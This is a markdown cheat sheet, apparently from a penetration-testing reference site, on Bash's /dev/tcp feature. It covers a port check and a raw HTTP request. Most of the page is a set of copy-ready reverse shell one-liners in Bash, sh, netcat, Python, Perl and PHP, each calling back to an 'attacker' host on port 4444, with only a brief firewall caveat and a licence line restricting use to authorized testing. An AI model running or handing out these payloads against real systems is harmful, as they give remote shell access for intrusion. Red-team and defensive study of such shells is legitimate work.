# /dev/tcp – Remote Shells & Connectivity via Shell Built-ins

The special file `/dev/tcp` allows **Bash** and some **sh-compatible shells** to make TCP (and UDP) connections directly from the command line — without external tools. It's commonly used for creating **reverse shells**, **port checks**, and **simple HTTP clients** from within the shell itself.

🔗 [Explore Shell-Based Connectivity on SploitHQ](https://sploithq.com/dev-tcp)

---

## 🔍 What Is `/dev/tcp`?

In Bash and certain POSIX-compliant shells, `/dev/tcp/HOST/PORT` is a virtual interface that opens a socket to a host and port, letting you send and receive data like a network client.

Supported in:
- `bash`
- `sh` (some versions)
- Not available in most other shells by default

---

## ⚙️ Basic Usage

### Check if a port is open:
```bash
echo > /dev/tcp/target.com/80 && echo "Port open" || echo "Port closed"
```

### Connect and manually type input/output:
```bash
exec 3<> /dev/tcp/target.com/80
echo -e "HEAD / HTTP/1.0\r\n" >&3
cat <&3
```

---

## 🧪 Reverse Shell Examples (via /dev/tcp)

### Bash Reverse Shell
```bash
bash -i >& /dev/tcp/attacker-ip/4444 0>&1
```

### Minimal Sh Reverse Shell (if supported)
```sh
0<&196;exec 196<>/dev/tcp/attacker-ip/4444; sh <&196 >&196 2>&196
```

---

## 🧰 Alternative Shells for Remote Connectivity

| Language | Reverse Shell Example |
|----------|------------------------|
| **Netcat** | `nc -e /bin/sh attacker-ip 4444` *(or use `-c` instead of `-e`)* |
| **Python** | `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` |
| **Perl** | `perl -e 'use Socket;$i="attacker";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` |
| **PHP** | `php -r '$sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |

---

## ⚠️ Security Considerations

- `/dev/tcp` is a shell feature — **not a real device**.
- Only available in shells compiled with networking support (like Bash).
- Use in **trusted environments only** — it does not offer encryption or authentication.
- Block outbound shells with firewalls and restrict shell access on production systems.

---

## 🌐 SploitHQ Shell Connectivity Hub

👉 [Visit the /dev/tcp Shell Page](https://sploithq.com/dev-tcp)

- Browse reverse shell examples for different languages
- Use copy-ready payloads for testing and simulations
- Learn how to build connectivity without netcat or socat

---

## 🔗 Related Tools

- [Netcat](https://sploithq.com/netcat)
- [Python Socket Tools](https://docs.python.org/3/library/socket.html)
- [SploitHQ Shell Pages](https://sploithq.com/dev-tcp)

---

## 📄 License

This reference is maintained by [SploitHQ](https://sploithq.com) and intended for educational, testing, and authorized red teaming only.
